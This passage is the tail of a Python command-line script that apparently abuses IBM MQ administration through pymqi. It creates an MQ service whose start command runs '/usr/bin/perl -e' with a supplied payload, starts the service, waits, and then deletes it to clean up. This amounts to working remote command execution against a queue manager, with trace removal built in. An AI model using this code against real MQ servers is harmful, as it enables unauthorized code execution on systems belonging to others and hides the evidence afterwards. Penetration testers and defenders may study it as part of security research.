        pymqi.CMQC.MQIA_SERVICE_CONTROL: pymqi.CMQC.MQSVC_CONTROL_MANUAL,
        pymqi.CMQC.MQIA_SERVICE_TYPE: pymqi.CMQC.MQSVC_TYPE_COMMAND,
        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: '/usr/bin/perl',
        pymqi.CMQC.MQCA_SERVICE_START_ARGS: "-e \"{0}\"".format(payload)
    }
    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_CREATE_SERVICE(args)

    # start the service
    click.secho('Starting service...', fg='green')
    args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}

    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_START_SERVICE(args)

    click.secho('Giving the service {0} second(s) to live...'.format(wait), dim=True)
    time.sleep(wait)

    # delete service
    click.secho('Cleaning up service...', dim=True)
    args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}

    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_DELETE_SERVICE(args)

    qmgr.disconnect()

    click.secho('Done', fg='green')


if __name__ == '__main__':
    cli()
